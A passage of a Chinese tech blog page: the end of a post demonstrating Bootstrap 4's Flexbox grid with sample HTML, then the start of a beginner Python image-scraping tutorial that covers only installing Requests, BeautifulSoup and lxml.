                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"dist/css/bootstrap-flex.css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"container"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">1</span> <span class="keyword">of</span> <span class="number">2</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">1</span> <span class="keyword">of</span> <span class="number">2</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">1</span> <span class="keyword">of</span> <span class="number">3</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">1</span> <span class="keyword">of</span> <span class="number">3</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">1</span> <span class="keyword">of</span> <span class="number">3</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"container"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">1</span> <span class="keyword">of</span> <span class="number">3</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-6"</span>&gt;</span><br><span class="line">            <span class="number">2</span> <span class="keyword">of</span> <span class="number">3</span> (wider)</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">3</span> <span class="keyword">of</span> <span class="number">3</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">1</span> <span class="keyword">of</span> <span class="number">3</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-5"</span>&gt;</span><br><span class="line">            <span class="number">2</span> <span class="keyword">of</span> <span class="number">3</span> (wider)</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">3</span> <span class="keyword">of</span> <span class="number">3</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"container"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">1</span> <span class="keyword">of</span> <span class="number">3</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-6"</span>&gt;</span><br><span class="line">            <span class="number">2</span> <span class="keyword">of</span> <span class="number">3</span> (wider)</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">3</span> <span class="keyword">of</span> <span class="number">3</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">1</span> <span class="keyword">of</span> <span class="number">3</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-5"</span>&gt;</span><br><span class="line">            <span class="number">2</span> <span class="keyword">of</span> <span class="number">3</span> (wider)</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            <span class="number">3</span> <span class="keyword">of</span> <span class="number">3</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"container"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row flex-items-xs-top"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> three columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> three columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> three columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row flex-items-xs-middle"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> three columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> three columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> three columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row flex-items-xs-bottom"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> three columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> three columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> three columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"container"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row flex-items-xs-left"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-4"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> two columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-4"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> two columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row flex-items-xs-center"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-4"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> two columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-4"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> two columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row flex-items-xs-right"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-4"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> two columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-4"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> two columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row flex-items-xs-around"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-4"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> two columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-4"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> two columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row flex-items-xs-between"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-4"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> two columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs-4"</span>&gt;</span><br><span class="line">            One <span class="keyword">of</span> two columns</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"container"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"row"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs flex-xs-unordered"</span>&gt;</span><br><span class="line">            First, <span class="keyword">but</span> unordered</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs flex-xs-last"</span>&gt;</span><br><span class="line">            Second, <span class="keyword">but</span> <span class="keyword">last</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"col-xs flex-xs-first"</span>&gt;</span><br><span class="line">            Third, <span class="keyword">but</span> <span class="keyword">first</span></span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .row &#123;</span><br><span class="line">        margin-top: <span class="number">1</span>rem;</span><br><span class="line">    &#125;</span><br><span class="line">    .row &gt; [<span class="built_in">class</span>^=<span class="string">"col-"</span>] &#123;</span><br><span class="line">        padding-top: <span class="number">.75</span>rem;</span><br><span class="line">        padding-bottom: <span class="number">.75</span>rem;</span><br><span class="line">        background-color: rgba(<span class="number">86</span>, <span class="number">61</span>, <span class="number">124</span>, <span class="number">0.15</span>);</span><br><span class="line">        border: <span class="number">1</span>px solid rgba(<span class="number">86</span>, <span class="number">61</span>, <span class="number">124</span>, <span class="number">0.2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    .flex-items-xs-top, .flex-items-xs-<span class="keyword">middle</span>,.flex-items-xs-bottom &#123;</span><br><span class="line">        min-height: <span class="number">6</span>rem;</span><br><span class="line">        background-color: rgba(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我把官方实例拿过来测试一下。 结果如下所示 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161029-0.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161029-0-1024x819.png" alt="QQ20161029-0"></a> 恩，完美！ 至于这个布局的用法，那就去官方文档领悟吧，和之前的 bootstrap 栅格化布局有比较大的不同。 不过如果你看了实例之后，就会豁然开朗了。</p>
                  <h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2>
                  <p>本用例代码已上传到 GitHub。 <a href="https://github.com/Germey/BootStrapFlex" target="_blank" rel="noopener">代码实例</a> 有兴趣的小伙伴可以下载测试。</p>
                  <h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2>
                  <p>本文讲解了利用抽取 Bootstrap V4 中的 Flex 布局方式以及用 gulp 重新编译 Bootstrap 的过程，希望对大家有帮助。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-10-29 19:15:45" itemprop="dateCreated datePublished" datetime="2016-10-29T19:15:45+08:00">2016-10-29</time>
                </span>
                <span id="/3253.html" class="post-meta-item leancloud_visitors" data-flag-title="BootStrap4提取并编译Flexbox Grid系统" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>9.9k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>9 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3179.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/3179.html" class="post-title-link" itemprop="url">小白爬虫第一弹之抓取妹子图</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>2018 年 12 月 11 日 入口页面多了一个连接 早期图片 更新了处理过后的代码（删掉了早期图片的 URL，大家可以自己尝试下载这个页面下的所有套图） 2017 年 8 月 30 日：mzitu.com 更新了防盗链导致下载图片全部失效，已更新处理办法： scrapy 版本也已更新 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/mz01.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/mz01.png" alt=""></a> 2017 年 4 月 24 日：用 scrapy 重写了一个 mzitu 的全站爬虫： <a href="http://cuiqingcai.com/4421.html">小白进阶之 Scrapy 第四篇（图片下载管道篇）</a> 2017 年 3 月 31 号 更新 <a href="http://www.mzitu.com/all" target="_blank" rel="noopener">http://www.mzitu.com/all</a> 这个地址已经被站长屏蔽了。下面的代码没法使了哦！仅提供学习方法。 <strong>PS：更改了一个新手比较难理解的坑（切换目录的问题），大陆之外的小伙伴儿 需要翻墙，mzitu.com 对大陆之外好像不可访问。倒数第四个代码块儿是 没有函数的脚本写法，看函数有困难的小伙伴儿，可以先看看这个。</strong> 这是一篇完全给新手写的爬虫教程、也是我第一次写博文···也不知道怎么写（我也是个菜鸟啊！各路大神拍砖轻点儿啊！）<a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021223818.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021223818.jpg" alt="QQ图片20161021223818"></a>由于经常在群里装逼加上群主懒啊（你看有多久没更新文章就知道了），让我来一篇爬虫的教程。<a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224219.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224219.gif" alt="QQ图片20161021224219"></a>如此装逼机会怎么能错过，今天我来给大家来一篇基础爬虫教程。 你要问目标是啥？ 要知道 XX 才是学习最大的动力啊！所以目标就是 <a href="http://www.mzitu.com" target="_blank" rel="noopener">mzitu.com</a> , <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224731.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224731.gif" alt="QQ图片20161021224731"></a>（废话真多还不开始） ， 下面请各位跟我的教程一步一步走，喂！！说的就是你啊！别看着了，照着教程做啊！<a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/9555112.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/9555112-300x212.jpg" alt="9555112"></a> <strong>1、基础环境部分：</strong> 工欲其事必先利器，要想把心爱的妹子搬进你的给她准备的房子，总得有几把斧子才行啊！下面这就是几把斧子！ <strong>1.1：Python 基础运行环境：本篇教程采用 Python3 来写，所以你需要给你的电脑装上 Python3 才行，我就说说 Windows 的环境（会玩 Linux 的各位应该不需要我多此一举了）。</strong> <strong>anaconda （<a href="https://www.continuum.io/downloads" target="_blank" rel="noopener">点我下载</a>）（这是一个 Python 的科学计算发行版本，作者打包好多好多的包， <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021230903.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021230903.jpg" alt="QQ图片20161021230903"></a>不知道干啥的没关系，你只需要知道拥有它之后，那些 Windows 下 pip 安装包报错的问题将不复存在）</strong> 下载不顺利的同学我已经传到百度云了：<a href="http://pan.baidu.com/s/1boAYaTL" target="_blank" rel="noopener">http://pan.baidu.com/s/1boAYaTL</a> <strong>1.2：Requests</strong> urllib 的升级版本打包了全部功能并简化了使用方法（<a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">点我查看官方文档</a>） <strong>1.3： beautifulsoup</strong> 是一个可以从 HTML 或 XML 文件中提取数据的 Python 库.它能够通过你喜欢的转换器实现惯用的文档导航,查找,修改文档的方式.（<a href="http://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/#" target="_blank" rel="noopener">点我查看官方文档</a>）（<a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" alt="QQ图片20161022193315"></a>作为一个菜鸟就别去装逼用 正则表达式了，匹配不到想要的内容，容易打击积极性。老老实实的用<strong>beautifulsoup</strong> 吧！虽然性能差了点、但是你会爱上它的。） <strong>1.4：LXML</strong> 一个 HTML 解析包 用于辅助 beautifulsoup 解析网页（如果你不用 anaconda，你会发现这个包在 Windows 下 pip 安装报错，<a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021230903.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021230903.jpg" alt="QQ图片20161021230903"></a>用了就不会啦。）。 上面的模块需要 单独安装，下面几个就不用啦。 <strong>1.5： OS</strong> 系统内置模块 下面是ＩＤＥ　你喜欢用什么就用什么啦！ <strong>1.6： PyCharm</strong> 一个草鸡好用的 PythonIDE 工具 、真滴！草鸡好用··（<a href="https://www.jetbrains.com/pycharm/download/" target="_blank" rel="noopener">我是下载地址</a>）试用三十天 足够完成这个小爬虫啦。（如果你电脑已经存在 Python 环境 又需要使用 anaconda 的话，请按照下面的图设置一下哦！） <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022200505.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022200505.png" alt="QQ图片20161022200505"></a> 好啦、下面开始安装需要的模块。 因为我安装的是<strong>anaconda</strong>这个科学计算的发行版，安装方式是酱紫滴：conda install 包名（当然 pip install 包名也是可以的哦！）</p>
                  <figure class="highlight mipsasm">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">conda <span class="keyword">install </span>requests</span><br><span class="line">conda <span class="keyword">install </span><span class="keyword">beautifulsoup4</span></span><br><span class="line"><span class="keyword">conda </span><span class="keyword">install </span>lxml</span><br><span class="line">或者</span><br><span class="line">pip <span class="keyword">install </span>requests</span><br><span class="line">pip <span class="keyword">install </span><span class="keyword">beautifulsoup4</span></span><br><span class="line"><span class="keyword">pip </span><span class="keyword">install </span>lxml</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
